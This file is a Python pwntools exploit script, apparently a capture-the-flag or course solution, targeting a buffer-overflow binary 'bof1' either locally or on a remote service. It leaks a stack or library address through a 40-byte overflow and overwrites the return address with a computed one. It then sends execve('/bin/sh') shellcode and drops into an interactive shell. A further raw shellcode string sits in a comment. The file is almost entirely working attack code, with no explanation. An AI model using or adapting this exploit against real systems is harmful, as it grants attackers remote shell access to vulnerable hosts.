#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 0x7ffff7f2ea43
# 8a44

from pwn import *
import sys
import struct

context.arch = 'amd64'
context.os = 'linux'

exe = './bof1'
port = 10258

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0


r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

codes = """
    xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
"""
shellcode = asm(codes)

# print(shellcode)
# print(len(payloads),payloads)

payloads = b'A'*40 
r.recvuntil(b'name? ')
r.send(payloads)

z = r.recvline()
print(z)
print(u64(z.split(b'A'*40)[1][:-1].ljust(8,b'\x00')))
addr = u64(z.split(b'A'*40)[1][:-1].ljust(8,b'\x00'))
print(hex(addr))

msg = addr + int("0xCA6FC",16) #msg addr
# main = 0x7ffff7f2eae4
# msg = int("0x7ffff7ff91e0",16)
print(hex(msg))


r.send(payloads)
z = r.recvline()
print(z)
payloads = b'A'*40 + p64(msg, endian='little')
print(payloads)
r.send(payloads)
z = r.recvline()
print(z)



# r.send(b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
r.send(shellcode)
# r.recvline()




r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
